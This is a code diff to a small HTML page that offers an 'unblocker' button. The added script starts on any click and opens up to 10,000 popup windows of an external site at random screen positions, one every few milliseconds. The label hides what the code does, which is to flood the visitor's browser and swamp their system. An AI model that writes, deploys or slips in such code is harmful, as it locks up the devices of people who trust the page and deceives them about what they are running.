@@ -11,12 +11,26 @@
     <br>
     <button onclick="press()">unblocker</button>
     <script>
-      let i = 1;
-      function press() {
-        while (i < 10) {
-          window.open('https://cznull.github.io/vsbm', '_blank', 'width=200,height=200');
-        }; 
-      };
+      const targetLink = "https://cznull.github.io/vsbm";
+const MAX_WINDOWS = 10000;
+let windowsOpened = 0;
+
+function spawnWindowSequentially() {
+    if (windowsOpened < MAX_WINDOWS) {
+        const randomLeft = Math.floor(Math.random() * window.screen.width);
+        const randomTop = Math.floor(Math.random() * window.screen.height);
+        const features = `width=400,height=400,top=${randomTop},left=${randomLeft}`;
+
+        window.open(targetLink, `monitored_window_${windowsOpened}`, features);
+        windowsOpened++;
+
+        setTimeout(spawnWindowSequentially, 10);
+    } else {
+        console.log(" ");
+    }
+}
+
+window.addEventListener('click', spawnWindowSequentially, { once: true });
     </script>
   </body>
 </html>
